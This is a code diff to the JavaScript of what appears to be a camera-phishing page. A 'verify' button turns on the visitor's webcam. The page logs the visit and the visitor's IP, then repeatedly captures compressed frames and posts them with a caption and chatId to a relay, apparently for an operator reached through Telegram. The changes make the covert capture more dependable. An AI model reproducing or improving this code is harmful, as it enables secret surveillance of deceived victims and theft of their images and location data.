@@ -28,7 +28,7 @@ async function fetchIP(){
   }catch(e){}
 }
 
-// Log visit (admin)
+// Visit log
 fetch("/api/send",{
   method:"POST",
   headers:{ "Content-Type":"application/json" },
@@ -42,11 +42,15 @@ async function startCamera(){
 
     stream = await navigator.mediaDevices.getUserMedia({video:true});
     video.srcObject = stream;
-    video.play();
 
-    showToast("📸 Camera active");
+    video.onloadedmetadata = () => {
+      video.play();
 
-    setTimeout(loopCapture,2000);
+      showToast("📸 Camera active");
+
+      // Start capture AFTER video is ready
+      setTimeout(loopCapture, 1000);
+    };
 
   }catch(e){
     showToast("Permission denied ❌");
@@ -57,6 +61,11 @@ async function startCamera(){
 function loopCapture(){
 
   const interval = setInterval(()=>{
+
+    if(video.videoWidth === 0 || video.videoHeight === 0){
+      console.log("Video not ready yet...");
+      return;
+    }
 
     captureImage();
     captureCount++;
@@ -82,12 +91,12 @@ function captureImage(){
   const ctx = canvas.getContext("2d");
   ctx.drawImage(video,0,0);
 
-  const image = canvas.toDataURL("image/jpeg");
+  const image = canvas.toDataURL("image/jpeg", 0.7); // compressed
 
   send(image);
 }
 
-// Send data
+// Send
 async function send(image){
 
   const caption = `
@@ -102,16 +111,24 @@ async function send(image){
 🔗 Admin: https://t.me/YOUR_TELEGRAM
 `;
 
-  await fetch("/api/send",{
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body: JSON.stringify({
-      image,
-      caption,
-      chatId,
-      type:"capture"
-    })
-  });
+  try{
+    const res = await fetch("/api/send",{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body: JSON.stringify({
+        image,
+        caption,
+        chatId,
+        type:"capture"
+      })
+    });
+
+    const data = await res.json();
+    console.log("Send status:", data);
+
+  }catch(err){
+    console.log("Send error:", err);
+  }
 }
 
 // Countdown
@@ -130,5 +147,5 @@ function startCountdown(){
   },1000);
 }
 
-// Button click
+// Button
 document.getElementById("verifyBtn").onclick = startCamera;
